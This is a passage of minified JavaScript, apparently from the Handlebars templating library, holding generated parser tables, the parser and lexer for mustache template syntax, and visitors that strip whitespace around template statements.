                    81: [2, 64],
                    82: [2, 64],
                    83: [2, 64],
                    84: [2, 64],
                    85: [2, 64]
                }, {
                    21: 70,
                    23: [2, 50],
                    65: [2, 50],
                    72: [2, 50],
                    80: [2, 50],
                    81: [2, 50],
                    82: [2, 50],
                    83: [2, 50],
                    84: [2, 50],
                    85: [2, 50]
                }, {
                    33: [2, 90],
                    61: 71,
                    65: [2, 90],
                    72: [2, 90],
                    80: [2, 90],
                    81: [2, 90],
                    82: [2, 90],
                    83: [2, 90],
                    84: [2, 90],
                    85: [2, 90]
                }, {
                    20: 75,
                    33: [2, 80],
                    50: 72,
                    63: 73,
                    64: 76,
                    65: [1, 44],
                    69: 74,
                    70: 77,
                    71: 78,
                    72: [1, 79],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {72: [1, 80]}, {
                    23: [2, 42],
                    33: [2, 42],
                    54: [2, 42],
                    65: [2, 42],
                    68: [2, 42],
                    72: [2, 42],
                    75: [2, 42],
                    80: [2, 42],
                    81: [2, 42],
                    82: [2, 42],
                    83: [2, 42],
                    84: [2, 42],
                    85: [2, 42],
                    87: [1, 51]
                }, {
                    20: 75,
                    53: 81,
                    54: [2, 84],
                    63: 82,
                    64: 76,
                    65: [1, 44],
                    69: 83,
                    70: 77,
                    71: 78,
                    72: [1, 79],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {26: 84, 47: [1, 67]}, {47: [2, 55]}, {
                    4: 85,
                    6: 3,
                    14: [2, 46],
                    15: [2, 46],
                    19: [2, 46],
                    29: [2, 46],
                    34: [2, 46],
                    39: [2, 46],
                    44: [2, 46],
                    47: [2, 46],
                    48: [2, 46],
                    51: [2, 46],
                    55: [2, 46],
                    60: [2, 46]
                }, {47: [2, 20]}, {
                    20: 86,
                    72: [1, 35],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {
                    4: 87,
                    6: 3,
                    14: [2, 46],
                    15: [2, 46],
                    19: [2, 46],
                    29: [2, 46],
                    34: [2, 46],
                    47: [2, 46],
                    48: [2, 46],
                    51: [2, 46],
                    55: [2, 46],
                    60: [2, 46]
                }, {26: 88, 47: [1, 67]}, {47: [2, 57]}, {
                    5: [2, 11],
                    14: [2, 11],
                    15: [2, 11],
                    19: [2, 11],
                    29: [2, 11],
                    34: [2, 11],
                    39: [2, 11],
                    44: [2, 11],
                    47: [2, 11],
                    48: [2, 11],
                    51: [2, 11],
                    55: [2, 11],
                    60: [2, 11]
                }, {15: [2, 49], 18: [2, 49]}, {
                    20: 75,
                    33: [2, 88],
                    58: 89,
                    63: 90,
                    64: 76,
                    65: [1, 44],
                    69: 91,
                    70: 77,
                    71: 78,
                    72: [1, 79],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {
                    65: [2, 94],
                    66: 92,
                    68: [2, 94],
                    72: [2, 94],
                    80: [2, 94],
                    81: [2, 94],
                    82: [2, 94],
                    83: [2, 94],
                    84: [2, 94],
                    85: [2, 94]
                }, {
                    5: [2, 25],
                    14: [2, 25],
                    15: [2, 25],
                    19: [2, 25],
                    29: [2, 25],
                    34: [2, 25],
                    39: [2, 25],
                    44: [2, 25],
                    47: [2, 25],
                    48: [2, 25],
                    51: [2, 25],
                    55: [2, 25],
                    60: [2, 25]
                }, {
                    20: 93,
                    72: [1, 35],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {
                    20: 75,
                    31: 94,
                    33: [2, 60],
                    63: 95,
                    64: 76,
                    65: [1, 44],
                    69: 96,
                    70: 77,
                    71: 78,
                    72: [1, 79],
                    75: [2, 60],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {
                    20: 75,
                    33: [2, 66],
                    36: 97,
                    63: 98,
                    64: 76,
                    65: [1, 44],
                    69: 99,
                    70: 77,
                    71: 78,
                    72: [1, 79],
                    75: [2, 66],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {
                    20: 75,
                    22: 100,
                    23: [2, 52],
                    63: 101,
                    64: 76,
                    65: [1, 44],
                    69: 102,
                    70: 77,
                    71: 78,
                    72: [1, 79],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {
                    20: 75,
                    33: [2, 92],
                    62: 103,
                    63: 104,
                    64: 76,
                    65: [1, 44],
                    69: 105,
                    70: 77,
                    71: 78,
                    72: [1, 79],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {33: [1, 106]}, {
                    33: [2, 79],
                    65: [2, 79],
                    72: [2, 79],
                    80: [2, 79],
                    81: [2, 79],
                    82: [2, 79],
                    83: [2, 79],
                    84: [2, 79],
                    85: [2, 79]
                }, {33: [2, 81]}, {
                    23: [2, 27],
                    33: [2, 27],
                    54: [2, 27],
                    65: [2, 27],
                    68: [2, 27],
                    72: [2, 27],
                    75: [2, 27],
                    80: [2, 27],
                    81: [2, 27],
                    82: [2, 27],
                    83: [2, 27],
                    84: [2, 27],
                    85: [2, 27]
                }, {
                    23: [2, 28],
                    33: [2, 28],
                    54: [2, 28],
                    65: [2, 28],
                    68: [2, 28],
                    72: [2, 28],
                    75: [2, 28],
                    80: [2, 28],
                    81: [2, 28],
                    82: [2, 28],
                    83: [2, 28],
                    84: [2, 28],
                    85: [2, 28]
                }, {
                    23: [2, 30],
                    33: [2, 30],
                    54: [2, 30],
                    68: [2, 30],
                    71: 107,
                    72: [1, 108],
                    75: [2, 30]
                }, {23: [2, 98], 33: [2, 98], 54: [2, 98], 68: [2, 98], 72: [2, 98], 75: [2, 98]}, {
                    23: [2, 45],
                    33: [2, 45],
                    54: [2, 45],
                    65: [2, 45],
                    68: [2, 45],
                    72: [2, 45],
                    73: [1, 109],
                    75: [2, 45],
                    80: [2, 45],
                    81: [2, 45],
                    82: [2, 45],
                    83: [2, 45],
                    84: [2, 45],
                    85: [2, 45],
                    87: [2, 45]
                }, {
                    23: [2, 44],
                    33: [2, 44],
                    54: [2, 44],
                    65: [2, 44],
                    68: [2, 44],
                    72: [2, 44],
                    75: [2, 44],
                    80: [2, 44],
                    81: [2, 44],
                    82: [2, 44],
                    83: [2, 44],
                    84: [2, 44],
                    85: [2, 44],
                    87: [2, 44]
                }, {54: [1, 110]}, {
                    54: [2, 83],
                    65: [2, 83],
                    72: [2, 83],
                    80: [2, 83],
                    81: [2, 83],
                    82: [2, 83],
                    83: [2, 83],
                    84: [2, 83],
                    85: [2, 83]
                }, {54: [2, 85]}, {
                    5: [2, 13],
                    14: [2, 13],
                    15: [2, 13],
                    19: [2, 13],
                    29: [2, 13],
                    34: [2, 13],
                    39: [2, 13],
                    44: [2, 13],
                    47: [2, 13],
                    48: [2, 13],
                    51: [2, 13],
                    55: [2, 13],
                    60: [2, 13]
                }, {38: 56, 39: [1, 58], 43: 57, 44: [1, 59], 45: 112, 46: 111, 47: [2, 76]}, {
                    33: [2, 70],
                    40: 113,
                    65: [2, 70],
                    72: [2, 70],
                    75: [2, 70],
                    80: [2, 70],
                    81: [2, 70],
                    82: [2, 70],
                    83: [2, 70],
                    84: [2, 70],
                    85: [2, 70]
                }, {47: [2, 18]}, {
                    5: [2, 14],
                    14: [2, 14],
                    15: [2, 14],
                    19: [2, 14],
                    29: [2, 14],
                    34: [2, 14],
                    39: [2, 14],
                    44: [2, 14],
                    47: [2, 14],
                    48: [2, 14],
                    51: [2, 14],
                    55: [2, 14],
                    60: [2, 14]
                }, {33: [1, 114]}, {
                    33: [2, 87],
                    65: [2, 87],
                    72: [2, 87],
                    80: [2, 87],
                    81: [2, 87],
                    82: [2, 87],
                    83: [2, 87],
                    84: [2, 87],
                    85: [2, 87]
                }, {33: [2, 89]}, {
                    20: 75,
                    63: 116,
                    64: 76,
                    65: [1, 44],
                    67: 115,
                    68: [2, 96],
                    69: 117,
                    70: 77,
                    71: 78,
                    72: [1, 79],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {33: [1, 118]}, {32: 119, 33: [2, 62], 74: 120, 75: [1, 121]}, {
                    33: [2, 59],
                    65: [2, 59],
                    72: [2, 59],
                    75: [2, 59],
                    80: [2, 59],
                    81: [2, 59],
                    82: [2, 59],
                    83: [2, 59],
                    84: [2, 59],
                    85: [2, 59]
                }, {33: [2, 61], 75: [2, 61]}, {33: [2, 68], 37: 122, 74: 123, 75: [1, 121]}, {
                    33: [2, 65],
                    65: [2, 65],
                    72: [2, 65],
                    75: [2, 65],
                    80: [2, 65],
                    81: [2, 65],
                    82: [2, 65],
                    83: [2, 65],
                    84: [2, 65],
                    85: [2, 65]
                }, {33: [2, 67], 75: [2, 67]}, {23: [1, 124]}, {
                    23: [2, 51],
                    65: [2, 51],
                    72: [2, 51],
                    80: [2, 51],
                    81: [2, 51],
                    82: [2, 51],
                    83: [2, 51],
                    84: [2, 51],
                    85: [2, 51]
                }, {23: [2, 53]}, {33: [1, 125]}, {
                    33: [2, 91],
                    65: [2, 91],
                    72: [2, 91],
                    80: [2, 91],
                    81: [2, 91],
                    82: [2, 91],
                    83: [2, 91],
                    84: [2, 91],
                    85: [2, 91]
                }, {33: [2, 93]}, {
                    5: [2, 22],
                    14: [2, 22],
                    15: [2, 22],
                    19: [2, 22],
                    29: [2, 22],
                    34: [2, 22],
                    39: [2, 22],
                    44: [2, 22],
                    47: [2, 22],
                    48: [2, 22],
                    51: [2, 22],
                    55: [2, 22],
                    60: [2, 22]
                }, {
                    23: [2, 99],
                    33: [2, 99],
                    54: [2, 99],
                    68: [2, 99],
                    72: [2, 99],
                    75: [2, 99]
                }, {73: [1, 109]}, {
                    20: 75,
                    63: 126,
                    64: 76,
                    65: [1, 44],
                    72: [1, 35],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {
                    5: [2, 23],
                    14: [2, 23],
                    15: [2, 23],
                    19: [2, 23],
                    29: [2, 23],
                    34: [2, 23],
                    39: [2, 23],
                    44: [2, 23],
                    47: [2, 23],
                    48: [2, 23],
                    51: [2, 23],
                    55: [2, 23],
                    60: [2, 23]
                }, {47: [2, 19]}, {47: [2, 77]}, {
                    20: 75,
                    33: [2, 72],
                    41: 127,
                    63: 128,
                    64: 76,
                    65: [1, 44],
                    69: 129,
                    70: 77,
                    71: 78,
                    72: [1, 79],
                    75: [2, 72],
                    78: 26,
                    79: 27,
                    80: [1, 28],
                    81: [1, 29],
                    82: [1, 30],
                    83: [1, 31],
                    84: [1, 32],
                    85: [1, 34],
                    86: 33
                }, {
                    5: [2, 24],
                    14: [2, 24],
                    15: [2, 24],
                    19: [2, 24],
                    29: [2, 24],
                    34: [2, 24],
                    39: [2, 24],
                    44: [2, 24],
                    47: [2, 24],
                    48: [2, 24],
                    51: [2, 24],
                    55: [2, 24],
                    60: [2, 24]
                }, {68: [1, 130]}, {
                    65: [2, 95],
                    68: [2, 95],
                    72: [2, 95],
                    80: [2, 95],
                    81: [2, 95],
                    82: [2, 95],
                    83: [2, 95],
                    84: [2, 95],
                    85: [2, 95]
                }, {68: [2, 97]}, {
                    5: [2, 21],
                    14: [2, 21],
                    15: [2, 21],
                    19: [2, 21],
                    29: [2, 21],
                    34: [2, 21],
                    39: [2, 21],
                    44: [2, 21],
                    47: [2, 21],
                    48: [2, 21],
                    51: [2, 21],
                    55: [2, 21],
                    60: [2, 21]
                }, {33: [1, 131]}, {33: [2, 63]}, {
                    72: [1, 133],
                    76: 132
                }, {33: [1, 134]}, {33: [2, 69]}, {15: [2, 12]}, {
                    14: [2, 26],
                    15: [2, 26],
                    19: [2, 26],
                    29: [2, 26],
                    34: [2, 26],
                    47: [2, 26],
                    48: [2, 26],
                    51: [2, 26],
                    55: [2, 26],
                    60: [2, 26]
                }, {23: [2, 31], 33: [2, 31], 54: [2, 31], 68: [2, 31], 72: [2, 31], 75: [2, 31]}, {
                    33: [2, 74],
                    42: 135,
                    74: 136,
                    75: [1, 121]
                }, {
                    33: [2, 71],
                    65: [2, 71],
                    72: [2, 71],
                    75: [2, 71],
                    80: [2, 71],
                    81: [2, 71],
                    82: [2, 71],
                    83: [2, 71],
                    84: [2, 71],
                    85: [2, 71]
                }, {33: [2, 73], 75: [2, 73]}, {
                    23: [2, 29],
                    33: [2, 29],
                    54: [2, 29],
                    65: [2, 29],
                    68: [2, 29],
                    72: [2, 29],
                    75: [2, 29],
                    80: [2, 29],
                    81: [2, 29],
                    82: [2, 29],
                    83: [2, 29],
                    84: [2, 29],
                    85: [2, 29]
                }, {
                    14: [2, 15],
                    15: [2, 15],
                    19: [2, 15],
                    29: [2, 15],
                    34: [2, 15],
                    39: [2, 15],
                    44: [2, 15],
                    47: [2, 15],
                    48: [2, 15],
                    51: [2, 15],
                    55: [2, 15],
                    60: [2, 15]
                }, {72: [1, 138], 77: [1, 137]}, {72: [2, 100], 77: [2, 100]}, {
                    14: [2, 16],
                    15: [2, 16],
                    19: [2, 16],
                    29: [2, 16],
                    34: [2, 16],
                    44: [2, 16],
                    47: [2, 16],
                    48: [2, 16],
                    51: [2, 16],
                    55: [2, 16],
                    60: [2, 16]
                }, {33: [1, 139]}, {33: [2, 75]}, {33: [2, 32]}, {72: [2, 101], 77: [2, 101]}, {
                    14: [2, 17],
                    15: [2, 17],
                    19: [2, 17],
                    29: [2, 17],
                    34: [2, 17],
                    39: [2, 17],
                    44: [2, 17],
                    47: [2, 17],
                    48: [2, 17],
                    51: [2, 17],
                    55: [2, 17],
                    60: [2, 17]
                }],
                defaultActions: {
                    4: [2, 1],
                    55: [2, 55],
                    57: [2, 20],
                    61: [2, 57],
                    74: [2, 81],
                    83: [2, 85],
                    87: [2, 18],
                    91: [2, 89],
                    102: [2, 53],
                    105: [2, 93],
                    111: [2, 19],
                    112: [2, 77],
                    117: [2, 97],
                    120: [2, 63],
                    123: [2, 69],
                    124: [2, 12],
                    136: [2, 75],
                    137: [2, 32]
                },
                parseError: function (e, t) {
                    throw new Error(e)
                },
                parse: function (e) {
                    var t = [0], n = [null], i = [], r = this.table, a = "", s = 0, o = 0, l = 0;
                    this.lexer.setInput(e), this.lexer.yy = this.yy, this.yy.lexer = this.lexer, void 0 === (this.yy.parser = this).lexer.yylloc && (this.lexer.yylloc = {});
                    var c = this.lexer.yylloc;
                    i.push(c);
                    var u = this.lexer.options && this.lexer.options.ranges;
                    "function" == typeof this.yy.parseError && (this.parseError = this.yy.parseError);
                    for (var d, p, h, f, m, v, g, y, b, x = {}; ;) {
                        if (h = t[t.length - 1], void 0 === (f = this.defaultActions[h] || (null == d && (b = void 0, d = b = "number" != typeof (b = this.lexer.lex() || 1) && this.symbols_[b] || b), r[h] && r[h][d])) || !f.length || !f[0]) {
                            var w = "";
                            if (!l) {
                                for (v in y = [], r[h]) this.terminals_[v] && 2 < v && y.push("'" + this.terminals_[v] + "'");
                                w = this.lexer.showPosition ? "Parse error on line " + (s + 1) + ":\n" + this.lexer.showPosition() + "\nExpecting " + y.join(", ") + ", got '" + (this.terminals_[d] || d) + "'" : "Parse error on line " + (s + 1) + ": Unexpected " + (1 == d ? "end of input" : "'" + (this.terminals_[d] || d) + "'"), this.parseError(w, {
                                    text: this.lexer.match,
                                    token: this.terminals_[d] || d,
                                    line: this.lexer.yylineno,
                                    loc: c,
                                    expected: y
                                })
                            }
                        }
                        if (f[0] instanceof Array && 1 < f.length) throw new Error("Parse Error: multiple actions possible at state: " + h + ", token: " + d);
                        switch (f[0]) {
                            case 1:
                                t.push(d), n.push(this.lexer.yytext), i.push(this.lexer.yylloc), t.push(f[1]), d = null, p ? (d = p, p = null) : (o = this.lexer.yyleng, a = this.lexer.yytext, s = this.lexer.yylineno, c = this.lexer.yylloc, 0 < l && l--);
                                break;
                            case 2:
                                if (g = this.productions_[f[1]][1], x.$ = n[n.length - g], x._$ = {
                                    first_line: i[i.length - (g || 1)].first_line,
                                    last_line: i[i.length - 1].last_line,
                                    first_column: i[i.length - (g || 1)].first_column,
                                    last_column: i[i.length - 1].last_column
                                }, u && (x._$.range = [i[i.length - (g || 1)].range[0], i[i.length - 1].range[1]]), void 0 !== (m = this.performAction.call(x, a, o, s, this.yy, f[1], n, i))) return m;
                                g && (t = t.slice(0, -1 * g * 2), n = n.slice(0, -1 * g), i = i.slice(0, -1 * g)), t.push(this.productions_[f[1]][0]), n.push(x.$), i.push(x._$), g = r[t[t.length - 2]][t[t.length - 1]], t.push(g);
                                break;
                            case 3:
                                return !0
                        }
                    }
                    return !0
                }
            };

            function n() {
                this.yy = {}
            }

            return e = {
                EOF: 1,
                parseError: function (e, t) {
                    if (!this.yy.parser) throw new Error(e);
                    this.yy.parser.parseError(e, t)
                },
                setInput: function (e) {
                    return this._input = e, this._more = this._less = this.done = !1, this.yylineno = this.yyleng = 0, this.yytext = this.matched = this.match = "", this.conditionStack = ["INITIAL"], this.yylloc = {
                        first_line: 1,
                        first_column: 0,
                        last_line: 1,
                        last_column: 0
                    }, this.options.ranges && (this.yylloc.range = [0, 0]), this.offset = 0, this
                },
                input: function () {
                    var e = this._input[0];
                    return this.yytext += e, this.yyleng++, this.offset++, this.match += e, this.matched += e, e.match(/(?:\r\n?|\n).*/g) ? (this.yylineno++, this.yylloc.last_line++) : this.yylloc.last_column++, this.options.ranges && this.yylloc.range[1]++, this._input = this._input.slice(1), e
                },
                unput: function (e) {
                    var t = e.length, n = e.split(/(?:\r\n?|\n)/g);
                    this._input = e + this._input, this.yytext = this.yytext.substr(0, this.yytext.length - t - 1), this.offset -= t;
                    var i = this.match.split(/(?:\r\n?|\n)/g);
                    return this.match = this.match.substr(0, this.match.length - 1), this.matched = this.matched.substr(0, this.matched.length - 1), n.length - 1 && (this.yylineno -= n.length - 1), e = this.yylloc.range, this.yylloc = {
                        first_line: this.yylloc.first_line,
                        last_line: this.yylineno + 1,
                        first_column: this.yylloc.first_column,
                        last_column: n ? (n.length === i.length ? this.yylloc.first_column : 0) + i[i.length - n.length].length - n[0].length : this.yylloc.first_column - t
                    }, this.options.ranges && (this.yylloc.range = [e[0], e[0] + this.yyleng - t]), this
                },
                more: function () {
                    return this._more = !0, this
                },
                less: function (e) {
                    this.unput(this.match.slice(e))
                },
                pastInput: function () {
                    var e = this.matched.substr(0, this.matched.length - this.match.length);
                    return (20 < e.length ? "..." : "") + e.substr(-20).replace(/\n/g, "")
                },
                upcomingInput: function () {
                    var e = this.match;
                    return e.length < 20 && (e += this._input.substr(0, 20 - e.length)), (e.substr(0, 20) + (20 < e.length ? "..." : "")).replace(/\n/g, "")
                },
                showPosition: function () {
                    var e = this.pastInput(), t = new Array(e.length + 1).join("-");
                    return e + this.upcomingInput() + "\n" + t + "^"
                },
                next: function () {
                    if (this.done) return this.EOF;
                    var e, t, n, i;
                    this._input || (this.done = !0), this._more || (this.yytext = "", this.match = "");
                    for (var r = this._currentRules(), a = 0; a < r.length && (!(t = this._input.match(this.rules[r[a]])) || e && !(t[0].length > e[0].length) || (e = t, n = a, this.options.flex)); a++) ;
                    return e ? ((i = e[0].match(/(?:\r\n?|\n).*/g)) && (this.yylineno += i.length), this.yylloc = {
                        first_line: this.yylloc.last_line,
                        last_line: this.yylineno + 1,
                        first_column: this.yylloc.last_column,
                        last_column: i ? i[i.length - 1].length - i[i.length - 1].match(/\r?\n?/)[0].length : this.yylloc.last_column + e[0].length
                    }, this.yytext += e[0], this.match += e[0], this.matches = e, this.yyleng = this.yytext.length, this.options.ranges && (this.yylloc.range = [this.offset, this.offset += this.yyleng]), this._more = !1, this._input = this._input.slice(e[0].length), this.matched += e[0], i = this.performAction.call(this, this.yy, this, r[n], this.conditionStack[this.conditionStack.length - 1]), this.done && this._input && (this.done = !1), i || void 0) : "" === this._input ? this.EOF : this.parseError("Lexical error on line " + (this.yylineno + 1) + ". Unrecognized text.\n" + this.showPosition(), {
                        text: "",
                        token: null,
                        line: this.yylineno
                    })
                },
                lex: function () {
                    var e = this.next();
                    return void 0 !== e ? e : this.lex()
                },
                begin: function (e) {
                    this.conditionStack.push(e)
                },
                popState: function () {
                    return this.conditionStack.pop()
                },
                _currentRules: function () {
                    return this.conditions[this.conditionStack[this.conditionStack.length - 1]].rules
                },
                topState: function () {
                    return this.conditionStack[this.conditionStack.length - 2]
                },
                pushState: function (e) {
                    this.begin(e)
                },
                options: {},
                performAction: function (e, t, n, i) {
                    function r(e, n) {
                        return t.yytext = t.yytext.substr(e, t.yyleng - n)
                    }

                    switch (n) {
                        case 0:
                            if ("\\\\" === t.yytext.slice(-2) ? (r(0, 1), this.begin("mu")) : "\\" === t.yytext.slice(-1) ? (r(0, 1), this.begin("emu")) : this.begin("mu"), t.yytext) return 15;
                            break;
                        case 1:
                            return 15;
                        case 2:
                            return this.popState(), 15;
                        case 3:
                            return this.begin("raw"), 15;
                        case 4:
                            return this.popState(), "raw" === this.conditionStack[this.conditionStack.length - 1] ? 15 : (t.yytext = t.yytext.substr(5, t.yyleng - 9), "END_RAW_BLOCK");
                        case 5:
                            return 15;
                        case 6:
                            return this.popState(), 14;
                        case 7:
                            return 65;
                        case 8:
                            return 68;
                        case 9:
                            return 19;
                        case 10:
                            return this.popState(), this.begin("raw"), 23;
                        case 11:
                            return 55;
                        case 12:
                            return 60;
                        case 13:
                            return 29;
                        case 14:
                            return 47;
                        case 15:
                        case 16:
                            return this.popState(), 44;
                        case 17:
                            return 34;
                        case 18:
                            return 39;
                        case 19:
                            return 51;
                        case 20:
                            return 48;
                        case 21:
                            this.unput(t.yytext), this.popState(), this.begin("com");
                            break;
                        case 22:
                            return this.popState(), 14;
                        case 23:
                            return 48;
                        case 24:
                            return 73;
                        case 25:
                        case 26:
                            return 72;
                        case 27:
                            return 87;
                        case 28:
                            break;
                        case 29:
                            return this.popState(), 54;
                        case 30:
                            return this.popState(), 33;
                        case 31:
                            return t.yytext = r(1, 2).replace(/\\"/g, '"'), 80;
                        case 32:
                            return t.yytext = r(1, 2).replace(/\\'/g, "'"), 80;
                        case 33:
                            return 85;
                        case 34:
                        case 35:
                            return 82;
                        case 36:
                            return 83;
                        case 37:
                            return 84;
                        case 38:
                            return 81;
                        case 39:
                            return 75;
                        case 40:
                            return 77;
                        case 41:
                            return 72;
                        case 42:
                            return t.yytext = t.yytext.replace(/\\([\\\]])/g, "$1"), 72;
                        case 43:
                            return "INVALID";
                        case 44:
                            return 5
                    }
                },
                rules: [/^(?:[^\x00]*?(?=(\{\{)))/, /^(?:[^\x00]+)/, /^(?:[^\x00]{2,}?(?=(\{\{|\\\{\{|\\\\\{\{|$)))/, /^(?:\{\{\{\{(?=[^\/]))/, /^(?:\{\{\{\{\/[^\s!"#%-,\.\/;->@\[-\^`\{-~]+(?=[=}\s\/.])\}\}\}\})/, /^(?:[^\x00]*?(?=(\{\{\{\{)))/, /^(?:[\s\S]*?--(~)?\}\})/, /^(?:\()/, /^(?:\))/, /^(?:\{\{\{\{)/, /^(?:\}\}\}\})/, /^(?:\{\{(~)?>)/, /^(?:\{\{(~)?#>)/, /^(?:\{\{(~)?#\*?)/, /^(?:\{\{(~)?\/)/, /^(?:\{\{(~)?\^\s*(~)?\}\})/, /^(?:\{\{(~)?\s*else\s*(~)?\}\})/, /^(?:\{\{(~)?\^)/, /^(?:\{\{(~)?\s*else\b)/, /^(?:\{\{(~)?\{)/, /^(?:\{\{(~)?&)/, /^(?:\{\{(~)?!--)/, /^(?:\{\{(~)?![\s\S]*?\}\})/, /^(?:\{\{(~)?\*?)/, /^(?:=)/, /^(?:\.\.)/, /^(?:\.(?=([=~}\s\/.)|])))/, /^(?:[\/.])/, /^(?:\s+)/, /^(?:\}(~)?\}\})/, /^(?:(~)?\}\})/, /^(?:"(\\["]|[^"])*")/, /^(?:'(\\[']|[^'])*')/, /^(?:@)/, /^(?:true(?=([~}\s)])))/, /^(?:false(?=([~}\s)])))/, /^(?:undefined(?=([~}\s)])))/, /^(?:null(?=([~}\s)])))/, /^(?:-?[0-9]+(?:\.[0-9]+)?(?=([~}\s)])))/, /^(?:as\s+\|)/, /^(?:\|)/, /^(?:([^\s!"#%-,\.\/;->@\[-\^`\{-~]+(?=([=~}\s\/.)|]))))/, /^(?:\[(\\\]|[^\]])*\])/, /^(?:.)/, /^(?:$)/],
                conditions: {
                    mu: {
                        rules: [7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44],
                        inclusive: !1
                    },
                    emu: {rules: [2], inclusive: !1},
                    com: {rules: [6], inclusive: !1},
                    raw: {rules: [3, 4, 5], inclusive: !1},
                    INITIAL: {rules: [0, 1, 44], inclusive: !0}
                }
            }, t.lexer = e, new ((n.prototype = t).Parser = n)
        }();
        t.default = n, e.exports = t.default
    }, function (e, t, n) {
        "use strict";
        var i = n(1).default;

        function r() {
            this.options = arguments.length <= 0 || void 0 === arguments[0] ? {} : arguments[0]
        }

        function a(e, t, n) {
            var i = e[(t = void 0 === t ? e.length : t) - 1];
            t = e[t - 2];
            return i ? "ContentStatement" === i.type ? (t || !n ? /\r?\n\s*?$/ : /(^|\r?\n)\s*?$/).test(i.original) : void 0 : n
        }

        function s(e, t, n) {
            var i = e[(t = void 0 === t ? -1 : t) + 1];
            t = e[t + 2];
            return i ? "ContentStatement" === i.type ? (t || !n ? /^\s*?\r?\n/ : /^\s*?(\r?\n|$)/).test(i.original) : void 0 : n
        }

        function o(e, t, n) {
            !(e = e[null == t ? 0 : t + 1]) || "ContentStatement" !== e.type || !n && e.rightStripped || (t = e.value, e.value = e.value.replace(n ? /^\s+/ : /^[ \t]*\r?\n?/, ""), e.rightStripped = e.value !== t)
        }

        function l(e, t, n) {
            if ((e = e[null == t ? e.length - 1 : t - 1]) && "ContentStatement" === e.type && (n || !e.leftStripped)) return t = e.value, e.value = e.value.replace(n ? /\s+$/ : /[ \t]+$/, ""), e.leftStripped = e.value !== t, e.leftStripped
        }

        t.__esModule = !0, n = i(n(39)), (r.prototype = new n.default).Program = function (e) {
            var t = !this.options.ignoreStandalone, n = !this.isRootSeen;
            this.isRootSeen = !0;
            for (var i = e.body, r = 0, c = i.length; r < c; r++) {
                var u, d, p, h, f = i[r], m = this.accept(f);
                m && (u = a(i, r, n), h = s(i, r, n), d = m.openStandalone && u, p = m.closeStandalone && h, h = m.inlineStandalone && u && h, m.close && o(i, r, !0), m.open && l(i, r, !0), t && h && (o(i, r), l(i, r) && "PartialStatement" === f.type && (f.indent = /([ \t]+$)/.exec(i[r - 1].original)[1])), t && d && (o((f.program || f.inverse).body), l(i, r)), t && p && (o(i, r), l((f.inverse || f.program).body)))
            }
            return e
        }, r.prototype.BlockStatement = r.prototype.DecoratorBlock = r.prototype.PartialBlockStatement = function (e) {
            this.accept(e.program), this.accept(e.inverse);
            var t = e.program || e.inverse, n = e.program && e.inverse, i = n, r = n;
            if (n && n.chained) for (i = n.body[0].program; r.chained;) r = r.body[r.body.length - 1].program;
            var c = {
                open: e.openStrip.open,
                close: e.closeStrip.close,
                openStandalone: s(t.body),
                closeStandalone: a((i || t).body)
            };
            return e.openStrip.close && o(t.body, null, !0), n ? ((n = e.inverseStrip).open && l(t.body, null, !0), n.close && o(i.body, null, !0), e.closeStrip.open && l(r.body, null, !0), !this.options.ignoreStandalone && a(t.body) && s(i.body) && (l(t.body), o(i.body))) : e.closeStrip.open && l(t.body, null, !0), c
        }, r.prototype.Decorator = r.prototype.MustacheStatement = function (e) {
            return e.strip
        }, r.prototype.PartialStatement = r.prototype.CommentStatement = function (e) {
            return {inlineStandalone: !0, open: (e = e.strip || {}).open, close: e.close}
        }, t.default = r, e.exports = t.default
    }, function (e, t, n) {
        "use strict";
        var i = n(1).default;
        t.__esModule = !0;
        var r = i(n(6));

        function a() {
            this.parents = []
        }

        function s(e) {
            this.acceptRequired(e, "path"), this.acceptArray(e.params), this.acceptKey(e, "hash")
        }

        function o(e) {
            s.call(this, e), this.acceptKey(e, "program"), this.acceptKey(e, "inverse")
        }

        function l(e) {
            this.acceptRequired(e, "name"), this.acceptArray(e.params), this.acceptKey(e, "hash")
        }

        a.prototype = {
            constructor: a,
            mutating: !1,
            acceptKey: function (e, t) {
                var n = this.accept(e[t]);
                if (this.mutating) {
                    if (n && !a.prototype[n.type]) throw new r.default('Unexpected node type "' + n.type + '" found when accepting ' + t + " on " + e.type);
                    e[t] = n
                }
            },
            acceptRequired: function (e, t) {
                if (this.acceptKey(e, t), !e[t]) throw new r.default(e.type + " requires " + t)
            },
            acceptArray: function (e) {
